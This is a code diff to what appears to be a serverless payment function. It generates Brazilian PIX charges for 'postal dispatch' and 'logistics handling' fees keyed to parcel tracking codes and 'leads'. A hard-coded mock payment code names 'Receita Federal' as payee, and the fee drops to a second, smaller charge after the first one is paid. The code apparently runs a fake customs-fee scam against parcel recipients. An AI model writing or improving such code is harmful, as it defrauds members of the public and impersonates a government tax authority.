@@ -16,14 +16,14 @@ serve(async (req) => {
     const { data: payments } = await supabase.from('pix_gateway_payments').select('status').contains('raw_payload', { trackingCode });
     const paidCount = payments?.filter(p => p.status === 'paid').length || 0;
 
-    const isOneRealTest = trackingCode === 'BR1REAL111BR' || trackingCode === 'BR9999X999BR';
+    // Novo código de teste de 1 Real
+    const isOneRealTest = trackingCode === 'BR7777X777BR';
     let amount = paidCount >= 1 ? 9.90 : 19.90;
     if (isOneRealTest && paidCount === 0) amount = 1.00;
 
     const taxName = paidCount >= 1 ? "Taxa de Manuseio Logístico" : "Despacho Postal";
     const { data: lead } = await supabase.from('leads').select('*').eq('codigo_rastreio', trackingCode).maybeSingle();
     
-    // Usando a nova API KEY 2 configurada
     const apiKey = Deno.env.get('ROYALBANKING_API_KEY2') || Deno.env.get('ROYALBANKING_API_KEY');
     const callbackUrl = "https://ulrigywayovxuyiktnlr.supabase.co/functions/v1/royal-banking-webhook";
 
@@ -31,7 +31,7 @@ serve(async (req) => {
       const mockId = "mock_" + Date.now();
       const mockPix = "00020101021126580014br.gov.bcb.pix0136123e4567-e89b-12d3-a456-4266141740005204000053039865405" + amount.toFixed(2) + "5802BR5913Receita Federal6008Brasilia62140510TAXA" + Date.now() + "6304A1B2";
       await supabase.from('pix_gateway_payments').upsert({ id_transaction: mockId, status: 'pending', raw_payload: { trackingCode, amount, taxName, type: 'tax' } });
-      return new Response(JSON.stringify({ success: true, pixCopiaECola: mockPix, idTransaction: mockId, amount }), { headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
+      return new Response(JSON.stringify({ success: true, pixCopiaECola: mockPix, idTransaction: mockId, amount, taxName }), { headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
     };
 
     if (!apiKey) return await generateMockPix();
@@ -68,7 +68,8 @@ serve(async (req) => {
       success: true, 
       pixCopiaECola: data.paymentCode, 
       idTransaction: data.idTransaction, 
-      amount 
+      amount,
+      taxName
     }), { headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
 
   } catch (error: any) {
